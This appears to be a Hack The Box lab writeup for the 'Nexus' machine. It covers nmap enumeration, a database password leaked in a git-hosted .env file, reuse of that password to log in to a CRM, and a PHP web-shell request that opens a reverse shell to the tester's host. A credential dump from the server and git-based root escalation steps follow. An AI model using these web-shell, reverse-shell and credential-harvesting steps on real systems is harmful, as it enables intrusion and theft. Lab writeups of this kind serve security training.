# Nexus HTB Easy Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.234.54 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-28 09:54 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:54
Completed NSE at 09:54, 0.00s elapsed
Initiating NSE at 09:54
Completed NSE at 09:54, 0.00s elapsed
Initiating NSE at 09:54
Completed NSE at 09:54, 0.00s elapsed
Initiating Ping Scan at 09:54
Scanning 10.129.234.54 [4 ports]
Completed Ping Scan at 09:54, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:54
Completed Parallel DNS resolution of 1 host. at 09:54, 0.50s elapsed
Initiating SYN Stealth Scan at 09:54
Scanning 10.129.234.54 [1000 ports]
Discovered open port 80/tcp on 10.129.234.54
Discovered open port 22/tcp on 10.129.234.54
Increasing send delay for 10.129.234.54 from 0 to 5 due to 101 out of 336 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 5 to 10 due to 19 out of 61 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 10 to 20 due to 11 out of 31 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 20 to 40 due to 11 out of 23 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 40 to 80 due to 11 out of 16 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 80 to 160 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 160 to 320 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 320 to 640 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.129.234.54 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Completed SYN Stealth Scan at 10:03, 504.50s elapsed (1000 total ports)
Initiating Service scan at 10:03
Scanning 2 services on 10.129.234.54
Completed Service scan at 10:03, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.234.54.
Initiating NSE at 10:03
Completed NSE at 10:03, 4.99s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.91s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Nmap scan report for 10.129.234.54
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Initiating NSE at 10:03
Completed NSE at 10:03, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 517.95 seconds
           Raw packets sent: 1771 (77.900KB) | Rcvd: 12037 (2.773MB)

```
## Web Emuneration
Emunerating `http://nexus.htb` found 2 emails: [j.matthew@nexus.htb] and [careers@nexus.htb]
Emunerating subdomains:
```bash

```

Go to **git.nexus.htb**, found a repo, exploring found this `.env` content:
```
APP_NAME='Krayin CRM'
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
VITE_HOST=
VITE_PORT=
LOG_CHANNEL=stack
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
DB_PREFIX=
BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=127.0.0.1
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com
MAIL_RECEIVER_DRIVER=sendgrid
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```
Found a password:
```
DB_PASSWORD=N27xh!!2ucY04
```
Go to **billing.nexus.htb** and use the creds `j.matthew@nexus.htb:N27xh!!2ucY04` to login, found version `2.2.0`, found [CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)
![[Pasted image 20260628103908.png]]
Get reverse shell through
```
http://billing.nexus.htb/storage/tinymce/16df7148457c63d5b6d7785b79c79010.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.15.11%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```
## Get user flag
Get password of `jones`:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/nexus]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.234.54] 45628
/bin/sh: 0: can't access tty; job control turned off
$ ls
0e3e3f435a22c0e4ede28b6ab9ea7f0e.png
169d89c2acae4ceba369cae854e928c3.png
16df7148457c63d5b6d7785b79c79010.php
579b78c06cc1b05ed388a043666f2b7d.png
$ cd ../
$ ls
data-transfer
tinymce
$ ppppppppppppppppppppppppppppppwd
/bin/sh: 4: ppppppppppppppppppppppppppppppwd: not found
$ pwd
/var/www/krayin/storage/app/public
$ cd ../../
$ ls
app
debugbar
framework
installed
logs
$ pwd
/var/www/krayin/storage
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nexus:~/krayin/storage$ cd ~/krayin    
cd ~/krayin
www-data@nexus:~/krayin$ ls
ls
CODE_OF_CONDUCT.md  artisan        database      phpunit.xml  storage
LICENSE             bootstrap      example.txt   pint.json    tests
README.md           composer.json  lang          public       vendor
UPGRADE.md          composer.lock  package.json  resources    vite.config.js
app                 config         packages      routes
www-data@nexus:~/krayin$ pwd
pwd
/var/www/krayin
www-data@nexus:~/krayin$ cat .env
cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@nexus:~/krayin$ 
```
Found password `y27xb3ha!!74GbR`
```bash
jones@nexus:~$ ls
user.txt
jones@nexus:~$ cat user.txt
9c520383145c0b237e563fd82b35f2de
jones@nexus:~$ 
```
## Get root flag
```bash
$ cd /tmp 
$ git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git 
$ cd rce 
$ touch README.md
```
```bash
$ python3 /tmp/build.py Done: 025b473292e1fdcdb027771defd8d3d0279c709f 
$ git push -u origin main --force
```
```bash
jones@nexus:~$ cat /var/log/template-sync.log
```
```bash
$ ssh -i /tmp/.k root@nexus.htb 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-106-generic x86_64) 
<SNIP> 
root@nexus:~# ls -la /root/root.txt 
-rw-r----- 1 root root 21 Apr 23 18:14 /root/root.txt
```


Achievement: https://labs.hackthebox.com/achievement/machine/2924947/948